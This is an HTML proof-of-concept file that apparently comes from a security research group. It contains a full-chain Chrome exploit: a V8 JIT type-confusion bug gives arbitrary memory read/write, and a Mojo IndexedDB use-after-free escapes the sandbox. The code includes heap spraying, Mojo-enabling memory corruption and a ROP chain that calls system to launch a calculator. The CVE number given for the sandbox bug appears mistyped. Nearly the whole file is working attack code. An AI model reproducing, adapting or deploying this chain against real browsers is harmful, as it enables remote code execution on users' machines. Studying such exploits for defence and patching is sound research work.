<!DOCTYPE html>
<html lang="en">
<head>
    <title>Chrome fullchain exploit</title>
    <meta name="author" content="@starlabs_sg">
    <!--
            RCE: CVE-2021-30632 - JIT Type Confusion, OOB, PoC by @Zeusb0X
            SBX: CVE-2021-60633 - Mojo IndexedDB, UAF

            Notes:
            - At the time of fixing these bugs, javascript binding of indexeddb was not generated in default, so you have to generate it by yourself.
            - This exploit use some fixed addresses for one version, because we have read/write arbitray we can find these addresses for others version.
            - Clear user-data-dir to re-run exploit or change the database names already used.

            References:
            - https://googleprojectzero.blogspot.com/2019/04/virtually-unlimited-memory-escaping.html
            - https://blog.theori.io/research/escaping-chrome-sandbox/
    -->
</head>
<body>
    <pre id='log'></pre>
    <script name="helper">
        function hex(value) {
            return "0x" + ("00000000" + value.toString(16).toUpperCase()).slice(-8);
        }

        function hex64(value) {
            return "0x" + ("0000000000000000" + value.toString(16).toUpperCase()).slice(-16);
        }

        function hexdump(ptr, length) {
            let num = Math.floor(length / 0x10);
            let dump = "";
            for (let i = 0; i < num; ++i) {
                let offset = 0x10 * i;
                let s = "\n" + hex(offset);
                s += ": " + hex(read_ptr(ptr, offset + 0));
                s += ", " + hex(read_ptr(ptr, offset + 4));
                s += ", " + hex(read_ptr(ptr, offset + 8));
                s += ", " + hex(read_ptr(ptr, offset + 12));
                dump += s;
            }
            console.log(dump + "\n");
        }

        function sleep(ms) {
            return new Promise(resolve => setTimeout(resolve, ms));
        }

        function print(str) {
            console.log(str);
            var log = document.getElementById('log');
            if (log) {
                log.innerText += str + '\n';
            }
        }
    </script>
    <script name="const">
        // for enable mojo
        const kGFrameMapPtr = 0x7ffff23b8448n;
        const kEnabledBindingsOffset = 0x4b4n;
        // for bypass sandbox
        const kAllocationCount = 0x88;
        const kExternalObjectSize = 0xb8;
        const kFileSystemAccessTokenOffset = 0x88;
        const kDataHandleOffset = 0x1e0;

        let chrome_base = 0x555555554000n;
        let pop_rax = chrome_base + 0x4cbf0e1n;
        let pop_rdi = chrome_base + 0x4c1621dn;
        let pop_rsi = chrome_base + 0x4db163en;
        let pop_rdx = chrome_base + 0x4c037d2n;
        // let syscall = chrome_base + 0x4bd12c0n;
        let system = 0x7fffb9d4a410n;  // system
        let xchg_rax_add_rsp = chrome_base + 0xb269fc4n;
        let nop = chrome_base + 0x4dc1297n;
    </script>
    <script src="mojo_bindings.js"></script>
    <script src="third_party/blink/public/mojom/blob/blob_registry.mojom.js"></script>
    <script src="third_party/blink/public/mojom/file_system_access/file_system_access_transfer_token.mojom.js"></script>
    <script src="third_party/blink/public/mojom/file_system_access/file_system_access_file_handle.mojom.js"></script>
    <script src="third_party/blink/public/mojom/file_system_access/file_system_access_manager.mojom.js"></script>
    <script src="third_party/blink/public/mojom/indexeddb/indexeddb.mojom.js"></script>

    <script name="sbx">
        function getAllocationConstructor() {
            let blob_registry_ptr = new blink.mojom.BlobRegistryPtr();
            Mojo.bindInterface(blink.mojom.BlobRegistry.name,
                                mojo.makeRequest(blob_registry_ptr).handle, "process", true);

            function Allocation(size=280) {
                function ProgressClient(allocate) {
                    function ProgressClientImpl() {
                    }
                    ProgressClientImpl.prototype = {
                        onProgress: async (arg0) => {
                            if (this.allocate.writePromise) {
                                this.allocate.writePromise.resolve(arg0);
                            }
                        }
                    };
                    this.allocate = allocate;

                    this.ptr = new mojo.AssociatedInterfacePtrInfo();
                    var progress_client_req = mojo.makeRequest(this.ptr);
                    this.binding = new mojo.AssociatedBinding(blink.mojom.ProgressClient, new ProgressClientImpl(), progress_client_req);

                    return this;
                }

                this.done = false;
                this.pipe = Mojo.createDataPipe({elementNumBytes: size, capacityNumBytes: size});
                this.progressClient = new ProgressClient(this);
                blob_registry_ptr.registerFromStream("", "", size, this.pipe.consumer, this.progressClient.ptr).then((res) => {
                    this.serialized_blob = res.blob;
                    this.done = true;
                });

                this.malloc = async function(data) {
                    // console.log("[+] malloc: " + data.byteLength);
                    promise = new Promise((resolve, reject) => {
                        this.writePromise = {resolve: resolve, reject: reject};
                    });
                    this.pipe.producer.writeData(data);
                    this.pipe.producer.close();
                    written = await promise;
                    while (!this.done) {
                        await sleep(50);
                    }
                    // console.assert(written == data.byteLength);
                    // console.log("[+] " + written + " " + data.byteLength);
                }

                this.free = async function() {
                    // print("[+] free blob");
                    this.serialized_blob.blob.ptr.reset();
                    await sleep(50);
                }

                this.read = function(offset, length) {
                this.readpipe = Mojo.createDataPipe({elementNumBytes: 1, capacityNumBytes: length});
                this.serialized_blob.blob.readRange(offset, length, this.readpipe.producer, null);
                return new Promise((resolve) => {
                    this.watcher = this.readpipe.consumer.watch({readable: true}, (r) => {
                        result = new ArrayBuffer(length);
                        this.readpipe.consumer.readData(result);
                        this.readpipe.consumer.close();
                        this.watcher.cancel();
                        resolve(result);
                    });
                    });
                }

                this.readQword = async function(offset) {
                    let res = await this.read(offset, 8);
                    return (new DataView(res)).getBigUint64(0, true);
                }

                this.readSideData = async function() {
                    let data = await this.serialized_blob.blob.readSideData();
                    return data;
                }

                return this;
            }

            async function allocate(data) {
                let allocation = new Allocation(data.byteLength);
                await allocation.malloc(data);
                return allocation;
            }

            function get_allocation(size) {
                return new Allocation(size);
            }

            return get_allocation;
        }

        function HeapSpray(buffer) {
            this.allocate = getAllocationConstructor();
            this.heap = Array(kAllocationCount);
            this.done = false;
            this.data = buffer;

            for (let i = 0; i < this.heap.length; i++) {
                this.heap[i] = this.allocate(this.data.byteLength);
            }

            this.spray = async function() {
                print("[+] spraying ...");

                // for (let i = 0; i < this.heap.length; i++) {
                //     await this.heap[i].malloc(this.data);
                // }
                await Promise.all(this.heap.map((a) => a.malloc(this.data)));

                this.done = true;
                print("[+] spray done!");
            }

            this.get_leak = async function(value) {
                while (!this.done) {
                    await sleep(500);
                }
                await sleep(500);
                let results = await Promise.all(this.heap.map((a) => a.readQword(kFileSystemAccessTokenOffset)));
                for (var i = 0; i < results.length; i++) {
                    if (results[i] != value) {
                        // print("[+] result " + i + ": " + results[i].toString(16));
                        let vector = [];
                        for (let j = 0; j < 3; j++) {
                            vector[j] = await this.heap[i].readQword(kFileSystemAccessTokenOffset + 8 * j);
                        }
                        return vector;
                    }
                }
                return [0n, 0n, 0n];
            }

            this.readSideData = async function() {
                for (let i = 0; i < this.heap.length; i++) {
                    await this.heap[i].readSideData();
                }
            }
        }

        async function trigger_uaf(db_name, file_name, heap) {
            let done = false;
            var idbFactoryPtr = new blink.mojom.IDBFactoryPtr();
            Mojo.bindInterface(blink.mojom.IDBFactory.name, mojo.makeRequest(idbFactoryPtr).handle);

            // Open DB
            var idbCallbacks = new mojo.AssociatedInterfacePtrInfo();
            mojo.makeRequest(idbCallbacks);

            var idbDatabaseCallbacks = new mojo.AssociatedInterfacePtrInfo();
            mojo.makeRequest(idbDatabaseCallbacks);

            var idbName = new mojoBase.mojom.String16();
            idbName.data = db_name;

            var idbTransaction = new mojo.AssociatedInterfacePtrInfo();;
            var idbTransactionRequest = mojo.makeRequest(idbTransaction);

            var idbTransactionPtr = new blink.mojom.IDBTransactionAssociatedPtr(idbTransaction);

            // console.log("=== open ===");
            idbFactoryPtr.open(idbCallbacks, idbDatabaseCallbacks, idbName, 5, idbTransactionRequest, 0);

            // create ObjectStore
            // console.log("=== createObjectStore ===");
            var object_store_id = 1;
            var objectStoreName = new mojoBase.mojom.String16();
            objectStoreName.data = "object_store";
            var keypathdata = new blink.mojom.IDBKeyPathData({stringArray: "test"})
            idbTransactionPtr.createObjectStore(object_store_id, objectStoreName, keypathdata, true);

            // Put a IDBValue within ExternalObject as File
            // console.log("=== put ===");
            var fileAccessHandlePtr;
            function FileSystemAccessTransferTokenImpl() {
                this.binding = new mojo.Binding(blink.mojom.FileSystemAccessTransferToken, this);
            }
            FileSystemAccessTransferTokenImpl.prototype = {
            clone: async (arg0) => {
                // IndexedDBBackingStore::Transaction::WriteNewBlobs is waiting for writing complete, so we can hookup COMMITTING state_ of transition
                // replace key/value in object store to delete the external object
                // console.log("=== clone ===");
                var value = new blink.mojom.IDBValue();
                value.bits = [0x41, 0x41, 0x41, 0x41];
                value.externalObjects = [];
                var key = new blink.mojom.IDBKey();
                key.string = new mojoBase.mojom.String16();
                key.string.data = "key";
                var mode = blink.mojom.IDBPutMode.AddOrUpdate;
                var index_keys = [];
                idbTransactionPtr.put(object_store_id, value, key, mode, index_keys);

                // commit force put operation
                idbTransactionPtr.commit(0);

                await heap.spray();
                done = true;

                // get token for file handle, control-flow comeback to callback within cached external object ==> UAF
                fileAccessHandlePtr.transfer(arg0);
            }
            };

            var fileSystemAccessManagerPtr = new blink.mojom.FileSystemAccessManagerPtr();
            Mojo.bindInterface(blink.mojom.FileSystemAccessManager.name, mojo.makeRequest(fileSystemAccessManagerPtr).handle, "context"); // work in context scope not in process scope, dont known reason at this time
            fileSystemAccessManagerPtr.getSandboxedFileSystem().then((response) => {
                // get sandbox directory so we can write on it
                // console.log("=== getSandboxedFileSystem ===");
                var directoryHandle = response.directory;
                directoryHandle.getFile(file_name, true).then((res) => {
                    // get file handle
                    // console.log("=== getFile ===");
                    fileAccessHandlePtr = res.file;
                    var fileAccessPtr = new blink.mojom.FileSystemAccessTransferTokenPtr();
                    var fileAccessImpl = new FileSystemAccessTransferTokenImpl();
                    var fileAccessRequest = mojo.makeRequest(fileAccessPtr);
                    fileAccessImpl.binding.bind(fileAccessRequest);

                    // put external object as file
                    var external_object = new blink.mojom.IDBExternalObject();
                    external_object.fileSystemAccessToken = fileAccessPtr;

                    var value = new blink.mojom.IDBValue();
                    value.bits = [0x41, 0x41, 0x41, 0x41];
                    value.externalObjects = [external_object];
                    var key = new blink.mojom.IDBKey();
                    key.string = new mojoBase.mojom.String16();
                    key.string.data = "key";
                    var mode = blink.mojom.IDBPutMode.AddOrUpdate;
                    var index_keys = [];
                    idbTransactionPtr.put(object_store_id, value, key, mode, index_keys);

                    // console.log("=== commit ===");
                    idbTransactionPtr.commit(0);
                });
            });

            while (!done) {
                await sleep(50);
            }
            await sleep(500);
            print("[+] trigger_uaf done");
        }

        function get_fake_external_object(free_addrs=[0n, 0n, 0n]) {
            let data = new ArrayBuffer(kExternalObjectSize);
            let uint8 = new Uint8Array(data);
            // for (let i = 0; i < uint8.length; i++) {
            //     uint8[i] = 0x41;
            // }
            uint8.fill(0x41);
            let view = new DataView(data);
            view.setUint32(0x0, 0x02, true); // IndexedDBExternalObject::object_type_ = ObjectType::kFileSystemAccessHandle
            view.setBigUint64(kFileSystemAccessTokenOffset, free_addrs[0], true); // IndexedDBExternalObject::file_system_access_token_
            view.setBigUint64(kFileSystemAccessTokenOffset + 0x8, free_addrs[1], true);
            view.setBigUint64(kFileSystemAccessTokenOffset + 0x10, free_addrs[2], true);

            return data;
        }

        function get_pwn_object(fake_obj_addr) {
            let rop = [
                xchg_rax_add_rsp,   // stack pivot
                0xdeadbeefn,
                0xdeadbeefn,
                nop,
                pop_rax,  // mprotect rop chain
                0x3bn,
                pop_rdi,
                fake_obj_addr + 0xb0n + 0x10n + BigInt(8 * 14),
                pop_rsi,
                0x0n,
                pop_rdx,
                0x0n,
                system,     // rsp align 0x10
                0x2323232323232323n,    // return
                0x6e69622f7273752fn,  // /usr/bin/xcalc
                0x636c6163782fn,
            ];

            let data = new ArrayBuffer(504);
            let uint8 = new Uint8Array(data);
            uint8.fill(0x0);
            let view = new DataView(data);
            view.setBigUint64(0x0, 0x4141414141414141n, true);
            view.setBigUint64(0x8, 0xabab000000000001n, true);
            view.setBigUint64(0x28, 0x0000000000000002n, true);
            view.setUint32(0x58, 0x4, true);  // BlobDataItem::Type::kReadableDataHandle
            view.setBigUint64(kDataHandleOffset, fake_obj_addr + 0xa0n, true);  // BlobDataItem::data_handle_
            view.setBigUint64(0xa0, fake_obj_addr + 0xb0n, true); // mov    rax, qword ptr [rdi]
            // call   qword ptr [rax + 0x10]
            for (let i = 0; i < rop.length; i++) {
                view.setBigUint64(0xb0 + 0x10 + 8 * i, rop[i], true);
            }

            return data;
        }

        async function exploit() {
            print("[+] Step 1: Get leak vector");
            let heap1 = new HeapSpray(get_fake_external_object());
            await trigger_uaf("first_db", Array(248).fill(0x41).join(''), heap1);   // spray with size of target vector == 504

            let leak1 = await heap1.get_leak(0n);
            print("[+] leak1: " + leak1.map(a => "0x" + a.toString(16)));

            let fake_pwn_object = get_pwn_object(leak1[0]);
            let heap5 = new HeapSpray(fake_pwn_object);

            // free leak memory
            print("[+] Step 2: Free leak memory")
            let heap2 = new HeapSpray(get_fake_external_object(leak1));
            await trigger_uaf("second_db", "haha", heap2);

            // let leak2 = await heap2.get_leak(leak1[0]);
            // print("[+] leak2: " + leak2.map(a => a.toString(16)));
            // await heap2.free_all();

            // spray DataHandle into leak memory
            print("[+] Step 3: Spray DataHandle");
            let heap3 = new HeapSpray(get_fake_external_object());
            await heap3.spray();
            let leak3 = await heap3.get_leak(0n);
            print("[+] leak3: " + leak3.map(a => "0x" + a.toString(16)));

            print("[+] Step 4: Free leak memory again");
            let heap4 = new HeapSpray(get_fake_external_object(leak1));
            await trigger_uaf("weird_third_db", "hoho", heap4);    // dont known weird db name

            print("[+] Step 5: Spray replace DataHandle");
            await heap5.spray();

            print("[+] Step 6: Trigger virtual call");
            await heap3.readSideData();

            print("[+] Done");
        }
    </script>
    <script name="main-rce">
        // We need to start with stable JSArray maps
        class Box extends Array
        {
            constructor(...args) {
                super(...args);
            }
        };

        var a = new Box(1,2,3);

        function set_smi_arr(smi_arr,x) {
            for (let i = 0; i < 0x200; ++i) {
                ++i;
            }
            if (x) {
                a = smi_arr;
            }
        }

        function set_double_arr(double_arr,x) {
            for (let i = 0; i < 0x200; ++i) {
                ++i;
            }
            if (x) {
                a = double_arr;
            }
        }

        function leak_elems_and_len() {
            for (let i = 0; i < 0x200; ++i) {
                ++i;
            }
            return a[11];
        }

        function set_elems_and_len(d) {
            for (let i = 0; i < 0x200; ++i) {
                ++i;
            }
            a[11] = d;
        }

        function read_corrupted_arr(corrupted_arr,idx) {
            for (let i = 0; i < 0x200; ++i) {
                ++i;
            }
            return corrupted_arr[idx];
        }

        function write_corrupted_arr(corrupted_arr,idx,val) {
            for (let i = 0; i < 0x200; ++i) {
                ++i;
            }
            corrupted_arr[idx] = val;
        }

        var b1 = new Box(1,2,3,4);
        set_smi_arr(b1, true);

        a.x = 1;
        delete a.x;

        for (var i = 0; i < 0x3000; ++i) {
            set_smi_arr(b1, false);
        }

        a[0] = 1.1;
        var b2 = new Box(1.1,2.2,3.3,4.4,5.5,6.6,7.7,8.8,9.9,10.10,11.11,12.12);
        set_double_arr(b2, true);

        for (var i = 0; i < 0x3000; ++i) {
            set_double_arr(b2, false);
        }

        for (var i = 0; i < 0x3000; ++i) {
            leak_elems_and_len();
            set_elems_and_len(12.13);
            read_corrupted_arr(b2, 0);
            write_corrupted_arr(b2, 0, 1.1);
        }

        let target_buffer = new ArrayBuffer(0x1000);
        let target_view = new DataView(target_buffer);
        var oob_arr = new Box(1,2,3,4,5,6,7,8,9,10,11,12);
        var corrupted_arr = new Box(1.1,1.2);
        // var leaks = [wi,sb];
        var leaks = new Array(0x10);
        leaks.fill(0x1);
        // leaks[0] = target_buffer;
        // leaks[1] = 0x4141414141;
        // leaks[2] = window;

        set_smi_arr(oob_arr, true);

        var ab = new ArrayBuffer(8);
        var f64 = new Float64Array(ab);
        var u32 = new Uint32Array(ab);

        let convert_buffer = new ArrayBuffer(8);
        let b32 = new Uint32Array(convert_buffer);
        let b64 = new BigUint64Array(convert_buffer);

        f64[0] = leak_elems_and_len();
        u32[1] = 0x42424242;    // len
        var init = f64[0];
        set_elems_and_len(f64[0]);

        function addrOf(obj) {
            leaks[0] = obj;
            f64[0] = init;
            set_elems_and_len(f64[0]);
            f64[0] = read_corrupted_arr(corrupted_arr, 6);
            return u32[0];
        }

        // read at compressed pointer
        function read_ptr(ptr, offset) {
            let index = Math.floor(offset / 8);
            f64[0] = init;
            u32[0] = ptr;
            set_elems_and_len(f64[0]);

            f64[0] = read_corrupted_arr(corrupted_arr, index);
            return u32[(offset / 4) % 2 ? 1 : 0];
        }

        function read_ptr64(ptr, offset) {
            b32[0] = read_ptr(ptr, offset);
            b32[1] = read_ptr(ptr, offset + 0x4);
            return b64[0];
        }

        // write to compressed pointer
        function write_ptr(ptr, offset, value) {
            let index = Math.floor(offset / 8);
            f64[0] = init;
            u32[0] = ptr;
            set_elems_and_len(f64[0]);

            f64[0] = read_corrupted_arr(corrupted_arr, index);
            u32[(offset / 4) % 2 ? 1 : 0] = value;
            write_corrupted_arr(corrupted_arr, index, f64[0]);
        }

        function write_ptr64(ptr, offset, value) {
            b64[0] = value;
            write_ptr(ptr, offset, b32[0]);
            write_ptr(ptr, offset + 0x4, b32[1]);
        }

        function getUint64(addr) {
            write_ptr64(target_ptr, 0x14, addr);
            return target_view.getBigUint64(0, true);
        }

        function setUint64(addr, value) {
            write_ptr64(target_ptr, 0x14, addr);
            target_view.setBigUint64(0, value, true);
        }

        function getUint32(addr) {
            write_ptr64(target_ptr, 0x14, addr);
            return target_view.getUint32(0, true);
        }

        function setUint32(addr, value) {
            write_ptr64(target_ptr, 0x14, addr);
            target_view.setUint32(0, value, true);
        }

        let target_ptr = addrOf(target_buffer);
        print("[+] target_ptr: " + hex(target_ptr));

        let target_store_ptr = read_ptr64(target_ptr, 0x14);
        // print("[+] target_store_ptr: " + hex64(target_store_ptr));

        async function enable_mojo() {
            let window_ptr = addrOf(window);
            print("[+] window_ptr: " + hex(window_ptr));

            // hexdump(window_ptr, 0x100);

            let g_frame_map_ptr = kGFrameMapPtr;
            while(getUint64(g_frame_map_ptr) != g_frame_map_ptr + 0x8n) {
                await sleep(500);
            }

            let node_ptr = getUint64(g_frame_map_ptr + 0x8n);
            print("[+] node_ptr: " + hex64(node_ptr));

            let render_frame_ptr = getUint64(node_ptr + 0x28n);
            print("[+] render_frame_ptr: " + hex64(render_frame_ptr));

            let enabled_bindings = getUint32(render_frame_ptr + kEnabledBindingsOffset);
            print("[+] enabled_bindings: " + hex(enabled_bindings));

            setUint32(render_frame_ptr + kEnabledBindingsOffset, 0x2);

            print("[+] reloading ...");
            window.location.reload();
        }

        if (typeof(Mojo) !== "undefined") {
            print("[+] Start exploit");
            exploit();
        }
        else {
            enable_mojo();
        }


    </script>
</body>
</html>